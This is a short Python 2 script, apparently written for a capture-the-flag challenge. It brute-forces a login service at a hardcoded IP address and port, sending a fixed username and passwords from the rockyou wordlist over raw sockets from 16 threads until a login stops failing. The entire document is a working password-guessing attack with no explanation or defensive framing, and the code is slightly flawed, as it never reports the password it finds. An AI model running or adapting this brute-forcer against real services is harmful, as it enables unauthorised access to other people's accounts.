import socket
from threading import Thread
import sys
from Queue import Queue

host = "142.93.117.193" # IP address here
port = 1337 # Port here
wordlist = "/mnt/d/rockyou.txt" # Point to wordlist file

f = open(wordlist, "r")
pws = f.read().split("\n")
q = Queue(pws)

for x in pws:
    q.put(x)

def try_pass(pw):
    username = "kruegster\n"   # Hint: use OSINT
    print "trying password: %s" % pw
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.recv(1024)
    s.send(username)
    s.recv(1024)
    s.send(pw+"\n")
    ret = s.recv(100)
    return ret

def brute_force():

    password = q.get()
    while "Fail\n" == try_pass(password):
        password = q.get()
        q.task_done()


if __name__ == '__main__':
    for i in range(16):
        worker = Thread(target=brute_force, args=())
        worker.start()